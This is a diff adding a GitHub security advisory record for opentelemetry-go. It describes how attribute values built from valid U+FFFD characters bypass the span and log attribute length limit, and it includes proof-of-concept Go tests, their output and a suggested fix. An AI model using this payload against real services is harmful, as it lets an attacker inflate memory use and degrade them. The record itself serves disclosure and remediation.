@@ -1,0 +1,107 @@
+{
+  "id": "GHSA-q7gw-24fr-5p69",
+  "modified": "2026-11-13T19:15:05.908318974Z",
+  "published": "2026-11-13T19:00:55Z",
+  "aliases": [
+    "CVE-2026-128085"
+  ],
+  "summary": "opentelemetry-go: AttributeValueLengthLimit is fully bypassed by attribute values composed of valid U+FFFD runes",
+  "details": "## Summary\n\nThe `AttributeValueLengthLimit` span/log-record limit can be bypassed entirely with attribute values that consist of valid U+FFFD (REPLACEMENT CHARACTER) runes. The counting-based truncation introduced by the fix for GHSA-p9f8-wvj8-2fg8 (commit `e016a78c9`, first released in v1.33.0) has an \"optimistic\" fast path that skips every U+FFFD without counting it and without falling back to the correct slow path. A value of 1000 U+FFFD runes (3000 bytes) is stored verbatim even with a limit of 5 characters (15 bytes). The same defect affects the attribute truncation paths in `go.opentelemetry.io/otel/sdk/trace` (`sdk/internal/attrnorm`), `go.opentelemetry.io/otel/sdk/log` (`sdk/log/internal/attrnorm`), and the auto-instrumentation tracer in `go.opentelemetry.io/otel/trace` (`trace/auto.go`, introduced in `v1.35.0`).\n\nThis is an incomplete-fix issue: it is a distinct defect in the replacement code that GHSA-p9f8-wvj8-2fg8 introduced, affecting exactly the versions that advisory says are fixed (\u003e= v1.33.0). The original advisory covers only the pre-v1.33.0 code.\n\n## Details\n\nThe shared truncation helper is generated from `internal/shared/attrnorm/truncate.go.tmpl`. In the v1.46.0 release, the generated copies are `sdk/internal/attrnorm/truncate.go` and `sdk/log/internal/attrnorm/truncate.go` (identical logic, different package names). The optimistic path (v1.46.0, `sdk/internal/attrnorm/truncate.go:175-199`) is:\n\n```go\n// Optimistically, assume all valid UTF-8.\nvar b strings.Builder\ncount := 0\nfor i, c := range s {\n    if c != utf8.RuneError {\n        count++\n        if count \u003e limit {\n            return s[:i]\n        }\n        continue\n    }\n    _, size := utf8.DecodeRuneInString(s[i:])\n    if size == 1 {\n        // invalid encoding: fall through to the correct slow path\n        ...\n        break\n    }\n}\n```\n\n`range` over a string yields `utf8.RuneError` both for invalid bytes (size 1) and for a legitimately encoded U+FFFD (size 3). Only the size-1 case enters the slow path. A valid U+FFFD rune is therefore neither counted nor truncating: the loop slides over it. Consequences:\n\n1. A value made only of valid U+FFFD runes never increments `count`, so no truncation ever triggers and the value is returned unchanged, whatever its length.\n2. In a mixed string, every U+FFFD contributes 3 bytes that are not counted, and the final `return s[:i]` keeps all previously skipped U+FFFD runes, so the retained size grows linearly with the number of U+FFFD runes and is not bounded by `limit`.\n\nThe OpenTelemetry specification states that truncation applies \"counting any character in it as 1\". A valid U+FFFD is one character and must count as 1; here it counts as 0. The regression test suite of the repository contains no U+FFFD case, which is why this went unnoticed.\n\nCall chains (v1.46.0):\n\n- trace: `span.SetAttributes` -\u003e `sdk/trace/span.go` (`normAttr`) -\u003e `attrnorm.Truncate` -\u003e `sdk/internal/attrnorm/truncate.go` (`truncate`)\n- log: `Record.AddAttributes` / `SetAttributes` -\u003e `sdk/log/record.go` (`attrnorm.TruncateValue`) -\u003e `sdk/log/internal/attrnorm/truncate.go` (`truncate`)\n\nDeduplication: GHSA-p9f8-wvj8-2fg8 describes the pre-v1.33.0 helper (`safeTruncateValidUTF8`), which gave up truncating entirely for strings containing RuneError. The rewrite in `e016a78c9` replaced that code; this report concerns the rewritten code, is present only in versions that the advisory lists as fixed, and no public issue or advisory describes it.\n\n## PoC\n\nMinimal reproduction with the published release (no repository checkout needed). Go 1.25+ is required (the release declares `go 1.25.0`; any recent toolchain auto-selects one).\n\nCreate a directory with these files.\n\n`go.mod` (then run `go mod tidy` once to fill `go.sum`):\n\n```\nmodule otelpoc\n\ngo 1.25.0\n\nrequire (\n\tgo.opentelemetry.io/otel v1.46.0\n\tgo.opentelemetry.io/otel/log v0.22.0\n\tgo.opentelemetry.io/otel/sdk v1.46.0\n\tgo.opentelemetry.io/otel/sdk/log v0.22.0\n\tgo.opentelemetry.io/otel/trace v1.46.0\n)\n```\n\n`otelgo_truncate_test.go`:\n\n```go\npackage otelpoc\n\nimport (\n\t\"context\"\n\t\"strings\"\n\t\"testing\"\n\t\"unicode/utf8\"\n\n\t\"go.opentelemetry.io/otel/attribute\"\n\tsdktrace \"go.opentelemetry.io/otel/sdk/trace\"\n\t\"go.opentelemetry.io/otel/sdk/trace/tracetest\"\n\t\"go.opentelemetry.io/otel/trace\"\n)\n\n// limitsWithLen returns span limits with AttributeValueLengthLimit=limit and\n// everything else unlimited, isolating the length-limit enforcement under test.\nfunc limitsWithLen(limit int) sdktrace.SpanLimits {\n\tlim := sdktrace.NewSpanLimits()\n\tlim.AttributeValueLengthLimit = limit\n\tlim.AttributeCountLimit = -1\n\tlim.AttributePerEventCountLimit = -1\n\tlim.AttributePerLinkCountLimit = -1\n\tlim.EventCountLimit = -1\n\tlim.LinkCountLimit = -1\n\treturn lim\n}\n\nfunc captureOneSpan(t *testing.T, limit int, attrs ...attribute.KeyValue) []attribute.KeyValue {\n\tt.Helper()\n\tsr := tracetest.NewSpanRecorder()\n\ttp := sdktrace.NewTracerProvider(\n\t\tsdktrace.WithSpanProcessor(sr),\n\t\tsdktrace.WithSpanLimits(limitsWithLen(limit)),\n\t)\n\tdefer func() { _ = tp.Shutdown(context.Background()) }()\n\n\ttr := tp.Tracer(\"poc\")\n\t_, span := tr.Start(context.Background(), \"op\")\n\tspan.SetAttributes(attrs...)\n\tspan.End()\n\n\tended := sr.Ended()\n\tif len(ended) != 1 {\n\t\tt.Fatalf(\"expected 1 ended span, got %d\", len(ended))\n\t}\n\treturn ended[0].Attributes()\n}\n\n// TestOT001_FFFDOnlyStringBypassesTraceLengthLimit demonstrates that a string\n// attribute composed of valid U+FFFD runes is stored completely untruncated\n// although AttributeValueLengthLimit=5.\nfunc TestOT001_FFFDOnlyStringBypassesTraceLengthLimit(t *testing.T) {\n\tconst limit = 5\n\tval := strings.Repeat(\"\\uFFFD\", 1000) // 1000 chars, 3000 bytes\n\n\tgot := captureOneSpan(t, limit, attribute.String(\"k\", val))\n\tif len(got) != 1 {\n\t\tt.Fatalf(\"expected 1 attribute, got %d\", len(got))\n\t}\n\tstored := got[0].Value.AsString()\n\tt.Logf(\"input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d\",\n\t\tutf8.RuneCountInString(val), len(val),\n\t\tutf8.RuneCountInString(stored), len(stored), limit)\n\t// Per OTel spec (\"counting any character in it as 1\") the stored value\n\t// must be at most `limit` characters (\u003c= 15 bytes for U+FFFD).\n\tif maxBytes := 3 * limit; len(stored) \u003e maxBytes {\n\t\tt.Fatalf(\"BYPASS: AttributeValueLengthLimit=%d but %d bytes stored (expected \u003c=%d)\",\n\t\t\tlimit, len(stored), maxBytes)\n\t}\n}\n\n// TestOT001_FFFDMixedStringOverRetains demonstrates that valid U+FFFD runes\n// are not counted in the optimistic truncation path: every U+FFFD adds 3\n// uncounted bytes to the retained value.\nfunc TestOT001_FFFDMixedStringOverRetains(t *testing.T) {\n\tconst limit = 5\n\tval := strings.Repeat(\"\\uFFFD\", 100) + strings.Repeat(\"A\", 6) // 106 chars, 306 bytes\n\n\tgot := captureOneSpan(t, limit, attribute.String(\"k\", val))\n\tstored := got[0].Value.AsString()\n\tt.Logf(\"input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d\",\n\t\tutf8.RuneCountInString(val), len(val),\n\t\tutf8.RuneCountInString(stored), len(stored), limit)\n\tif chars := utf8.RuneCountInString(stored); chars \u003e limit {\n\t\tt.Fatalf(\"BYPASS: AttributeValueLengthLimit=%d but %d chars / %d bytes stored\",\n\t\t\tlimit, chars, len(stored))\n\t}\n}\n\n// TestOT001_ASCIIControl is the control case: plain ASCII over-limit values\n// ARE truncated, proving the length limit is active in the same setup.\nfunc TestOT001_ASCIIControl(t *testing.T) {\n\tconst limit = 5\n\tval := strings.Repeat(\"B\", 20)\n\n\tgot := captureOneSpan(t, limit, attribute.String(\"k\", val))\n\tstored := got[0].Value.AsString()\n\tt.Logf(\"input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d\",\n\t\tutf8.RuneCountInString(val), len(val),\n\t\tutf8.RuneCountInString(stored), len(stored), limit)\n\tif len(stored) != limit {\n\t\tt.Fatalf(\"control failed: ASCII value not truncated (stored %d bytes)\", len(stored))\n\t}\n}\n\n// TestOT001_EventAttributesNotLengthTruncated documents that span-event\n// attributes bypass AttributeValueLengthLimit entirely (no attrnorm.Truncate\n// call in recordingSpan.addEvent).\nfunc TestOT001_EventAttributesNotLengthTruncated(t *testing.T) {\n\tconst limit = 5\n\tval := strings.Repeat(\"C\", 100)\n\n\tsr := tracetest.NewSpanRecorder()\n\ttp := sdktrace.NewTracerProvider(\n\t\tsdktrace.WithSpanProcessor(sr),\n\t\tsdktrace.WithSpanLimits(limitsWithLen(limit)),\n\t)\n\tdefer func() { _ = tp.Shutdown(context.Background()) }()\n\ttr := tp.Tracer(\"poc\")\n\t_, span := tr.Start(context.Background(), \"op\")\n\tspan.AddEvent(\"ev\", trace.WithAttributes(attribute.String(\"k\", val)))\n\tspan.End()\n\n\tended := sr.Ended()\n\tevents := ended[0].Events()\n\tif len(events) != 1 {\n\t\tt.Fatalf(\"expected 1 event, got %d\", len(events))\n\t}\n\tstored := events[0].Attributes[0].Value.AsString()\n\tt.Logf(\"event attribute input: %d bytes; stored: %d bytes; limit=%d\", len(val), len(stored), limit)\n\tif len(stored) \u003e limit {\n\t\tt.Logf(\"CONFIRMED: event attribute not length-truncated (%d bytes \u003e limit %d)\", len(stored), limit)\n\t}\n}\n```\n\n(The `-run` pattern above selects the three truncation cases plus the control; the fourth test function is included because it is part of the exact file that produced the output below - it compiles but is not selected by the pattern, and its output does not appear.)\n\n`otelgo_log_truncate_test.go`:\n\n```go\npackage otelpoc\n\nimport (\n\t\"context\"\n\t\"strings\"\n\t\"sync\"\n\t\"testing\"\n\t\"unicode/utf8\"\n\n\t\"go.opentelemetry.io/otel/attribute\"\n\tapisdk \"go.opentelemetry.io/otel/log\"\n\tsdklog \"go.opentelemetry.io/otel/sdk/log\"\n)\n\ntype captureProcessor struct {\n\tmu   sync.Mutex\n\trecs []*sdklog.Record\n}\n\nfunc (c *captureProcessor) Enabled(context.Context, sdklog.EnabledParameters) bool { return true }\n\nfunc (c *captureProcessor) OnEmit(_ context.Context, r *sdklog.Record) error {\n\tc.mu.Lock()\n\tdefer c.mu.Unlock()\n\tclone := r.Clone()\n\tc.recs = append(c.recs, \u0026clone)\n\treturn nil\n}\n\nfunc (c *captureProcessor) Shutdown(context.Context) error { return nil }\nfunc (c *captureProcessor) ForceFlush(context.Context) error {\n\treturn nil\n}\n\n// TestOT001_FFFDOnlyStringBypassesLogLengthLimit repeats the bypass against\n// the sdk/log attribute path (sdk/log/internal/attrnorm, same template).\nfunc TestOT001_FFFDOnlyStringBypassesLogLengthLimit(t *testing.T) {\n\tconst limit = 5\n\tcp := \u0026captureProcessor{}\n\tlp := sdklog.NewLoggerProvider(\n\t\tsdklog.WithProcessor(cp),\n\t\tsdklog.WithAttributeValueLengthLimit(limit),\n\t)\n\tdefer func() { _ = lp.Shutdown(context.Background()) }()\n\n\tlogger := lp.Logger(\"poc\")\n\tvar r apisdk.Record\n\tr.SetSeverity(apisdk.SeverityInfo)\n\tr.AddAttributes(attribute.String(\"k\", strings.Repeat(\"\\uFFFD\", 1000)))\n\tlogger.Emit(context.Background(), r)\n\n\tcp.mu.Lock()\n\tif len(cp.recs) != 1 {\n\t\tt.Fatalf(\"expected 1 record, got %d\", len(cp.recs))\n\t}\n\trec := cp.recs[0]\n\tcp.mu.Unlock()\n\n\tstored := \"\"\n\trec.WalkAttributes(func(kv attribute.KeyValue) bool {\n\t\tif string(kv.Key) == \"k\" {\n\t\t\tstored = kv.Value.AsString()\n\t\t}\n\t\treturn true\n\t})\n\tt.Logf(\"sdk/log input: 1000 chars / 3000 bytes; stored: %d chars / %d bytes; limit=%d\",\n\t\tutf8.RuneCountInString(stored), len(stored), limit)\n\tif maxBytes := 3 * limit; len(stored) \u003e maxBytes {\n\t\tt.Fatalf(\"BYPASS: sdk/log WithAttributeValueLengthLimit=%d but %d bytes stored (expected \u003c=%d)\",\n\t\t\tlimit, len(stored), maxBytes)\n\t}\n}\n```\n\nRun:\n\n```\ngo mod tidy\ngo test -count=1 -v -run \"TestOT001_FFFDOnlyStringBypassesTraceLengthLimit|TestOT001_FFFDMixedStringOverRetains|TestOT001_ASCIIControl|TestOT001_FFFDOnlyStringBypassesLogLengthLimit\" .\n```\n\nExpected output (captured against the published v1.46.0 modules; the three FAIL lines are the bypass being triggered and the PASS control proves the limit is active in the same setup; the only varying parts are the durations in parentheses and the total on the `FAIL\totelpoc` summary line):\n\n```\n=== RUN   TestOT001_FFFDOnlyStringBypassesLogLengthLimit\n    otelgo_log_truncate_test.go:66: sdk/log input: 1000 chars / 3000 bytes; stored: 1000 chars / 3000 bytes; limit=5\n    otelgo_log_truncate_test.go:69: BYPASS: sdk/log WithAttributeValueLengthLimit=5 but 3000 bytes stored (expected \u003c=15)\n--- FAIL: TestOT001_FFFDOnlyStringBypassesLogLengthLimit (0.00s)\n=== RUN   TestOT001_FFFDOnlyStringBypassesTraceLengthLimit\n    otelgo_truncate_test.go:61: input: 1000 chars / 3000 bytes; stored: 1000 chars / 3000 bytes; limit=5\n    otelgo_truncate_test.go:67: BYPASS: AttributeValueLengthLimit=5 but 3000 bytes stored (expected \u003c=15)\n--- FAIL: TestOT001_FFFDOnlyStringBypassesTraceLengthLimit (0.00s)\n=== RUN   TestOT001_FFFDMixedStringOverRetains\n    otelgo_truncate_test.go:81: input: 106 chars / 306 bytes; stored: 105 chars / 305 bytes; limit=5\n    otelgo_truncate_test.go:85: BYPASS: AttributeValueLengthLimit=5 but 105 chars / 305 bytes stored\n--- FAIL: TestOT001_FFFDMixedStringOverRetains (0.00s)\n=== RUN   TestOT001_ASCIIControl\n    otelgo_truncate_test.go:98: input: 20 chars / 20 bytes; stored: 5 chars / 5 bytes; limit=5\n--- PASS: TestOT001_ASCIIControl (0.00s)\nFAIL\nFAIL\totelpoc\t0.059s\nFAIL\n```\n\nThe mixed-string case stores 105 characters for a limit of 5: the 100 U+FFFD runes (300 uncounted bytes) are all retained, plus 5 of the 6 ASCII characters.\n\n## Impact\n\nApplications that enable `AttributeValueLengthLimit` (or `WithAttributeValueLengthLimit` for logs) to bound attribute memory do not get that bound for values containing valid U+FFFD runes. Span and log-record attribute values are routinely derived from untrusted input (HTTP headers, request bodies, database fields), so an attacker can inflate per-span memory retention linearly, defeating the memory protection the operator explicitly enabled and accumulating increased memory usage over the span/log pipeline. Confidentiality and integrity are not affected.\n\n## Suggested fix\n\nIn the optimistic loop, count every rune of size \u003e 1 (including the legitimately encoded U+FFFD) and only divert size-1 invalid bytes to the slow path. Add regression cases for: pure U+FFFD strings, U+FFFD-dominated mixed strings, and a truncation point landing after a U+FFFD (the current `truncate_test.go` has no U+FFFD case).",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "go.opentelemetry.io/otel/sdk",
+        "purl": "pkg:golang/go.opentelemetry.io/otel/sdk"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.33.0"
+            },
+            {
+              "fixed": "1.47.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-q7gw-24fr-5p69/GHSA-q7gw-24fr-5p69.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "go.opentelemetry.io/otel/sdk/log",
+        "purl": "pkg:golang/go.opentelemetry.io/otel/sdk/log"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.9.0"
+            },
+            {
+              "fixed": "1.47.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-q7gw-24fr-5p69/GHSA-q7gw-24fr-5p69.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "go.opentelemetry.io/otel/trace",
+        "purl": "pkg:golang/go.opentelemetry.io/otel/trace"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.35.0"
+            },
+            {
+              "fixed": "1.47.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-q7gw-24fr-5p69/GHSA-q7gw-24fr-5p69.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/open-telemetry/opentelemetry-go/security/advisories/GHSA-q7gw-24fr-5p69"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/open-telemetry/opentelemetry-go/commit/017b08c7f1018b619991aaf6b2299d4beb9da1d3"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/open-telemetry/opentelemetry-go"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/open-telemetry/opentelemetry-go/releases/tag/sdk/log/v1.47.0"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/open-telemetry/opentelemetry-go/releases/tag/sdk/v1.47.0"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/open-telemetry/opentelemetry-go/releases/tag/trace/v1.47.0"
+    }
+  ]
+}
